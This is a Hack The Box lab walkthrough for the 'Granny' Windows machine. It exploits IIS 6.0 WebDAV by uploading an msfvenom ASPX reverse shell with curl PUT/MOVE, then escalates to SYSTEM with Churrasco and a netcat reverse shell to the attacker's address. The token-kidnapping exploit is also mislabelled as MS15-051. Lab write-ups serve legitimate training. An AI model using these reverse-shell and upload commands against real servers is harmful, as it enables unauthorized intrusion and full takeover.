# Granny

**OS:** Windows

**Level:** Easy

**Links:** [1](https://www.hackthebox.com/machines/Granny)  [2](https://app.hackthebox.com/machines/Granny)

**Machine ip:** 10.10.10.15

![Granny](https://github.com/h4md153v63n/CTFs/assets/5091265/69e37688-dfcb-49cc-810a-ec81fec1581b)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.15 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.15 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ec0f4480-c9e2-4ca0-a2e8-0d68e25572cc)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/212f7ec1-e525-4478-9288-149a9f5e5ec4)


## Enumeration
Visit **http://10.10.10.15**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6c195f8b-51e0-4e25-bb23-ac0b0deee900)

Directory fuzzing, and there's nothing useful here:

`gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.15/ -k -n -r -t 50`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a16434ff-a8b8-4fa4-98b3-ada15e1356a3)

The server is a IIS httpd 6.0 server, and it's using **WebDAV** extension:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0c3e5ae0-216e-4315-a416-81bac7972e2d)

Check the allowed HTTP methods: `davtest --url http://10.10.10.15`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ed156ba0-61f4-4c6b-b74a-0d1eb796979b)


## Exploitation & Gaining Access

### Method 1: 
Generate a reverse shell with msfvenom:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f aspx > shell.aspx

mv shell.aspx shell.txt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/03d4a892-0847-4152-9540-70b82ce26b5f)

**Alternative shells:**
+ `/usr/share/webshells/aspx/cmdasp.aspx`

Upload it using curl with PUT method, and rename it back to the original file type aspx using curl with MOVE option:

```
curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt

curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt' 
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b2ef3cc0-7d3c-41b9-aa22-768d296ff1a6)

```
# Start netcat listener:
nc -nvlp 4444

# Trigger the revershell using curl, or opening on the browser:
curl http://10.10.10.15/shell.aspx
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3a072777-cb2a-4d6d-b136-0577b7f52fb0)

We got the shell, and there's no privilege to read user.txt flag.


## Privilege Escalation

### Method 1: MS15-051 [1](https://github.com/Re4son/Churrasco) / CVE:N/A [2](https://www.exploit-db.com/exploits/6705)
Run `systeminfo` command:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6515a046-7ff5-44d9-97c0-9474442fb379)

```
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/20c25173-1276-4990-ad97-70c861e7ff03)

Run Windows Exploit Suggester:

```
# On the kali attack vm:
python2 windows-exploit-suggester.py --update

python2 windows-exploit-suggester.py --database 2024-04-15-mssb.xls --systeminfo systeminfo.txt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/287d5c3d-4949-47e9-a841-b029af5fe2f0)

There are many exploits for privilege escalation here, but for now try **MS15-051**: [Microsoft Windows Server 2003 — Token Kidnapping Local Privilege Escalation](https://www.exploit-db.com/exploits/6705).

Download exploit [1](https://github.com/Re4son/Churrasco), and transfer to the target victim, then prepare netcat listener, and run it:

```
# On the kali attack vm:
smbserver.py desktop /home/kali/Desktop

smbserver.py win /usr/share/windows-binaries/

nc -lnvp 5555

# On the target machine:
cd c:\inetpub\wwwroot

copy \\10.10.14.24\desktop\churrasco.exe

copy \\10.10.14.24\win\nc.exe

churrasco.exe -d "C:\Inetpub\wwwroot\nc.exe 10.10.14.24 5555 -e cmd.exe"
```

Get the shell as **nt authority\system**, and read both user.txt flag and root.txt flag:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/86116b29-e1bd-41bd-b658-be751f8e5c84)


### Method 2: MS14-058 -> Metasploit Solution
Check the solution [1](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/granny-writeup-w-o-and-w-metasploit#id-317c) [2](https://0xdf.gitlab.io/2019/03/06/htb-granny.html#ms14-058)


# References & Alternatives
+ https://vvmlist.github.io/#Granny
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/granny-writeup-w-o-and-w-metasploit
+ https://0xdf.gitlab.io/2019/03/06/htb-granny.html
+ 


## CVE Scripting
+ **MS15-051:**
  + https://www.exploit-db.com/exploits/6705
  + https://github.com/Re4son/Churrasco
  + 


## Tools
+ **davtest:**
  + https://www.kali.org/tools/davtest/
  + https://cirt.net/DAVTest
  + https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav
+ **Windows Exploit Suggester:**
  + https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+ .aspx shells:
  + msfvenom 
  + `/usr/share/webshells/aspx/cmdasp.aspx`


## Technical Knowledge
+ **WebDav Vulnerability:**
  + https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav


## Problems Solution
+ 


## For More
+ https://asfiyashaikh.medium.com/windows-privilege-escalation-using-sudo-su-ae5573feccd9
+ https://linux.die.net/man/1/cadaver

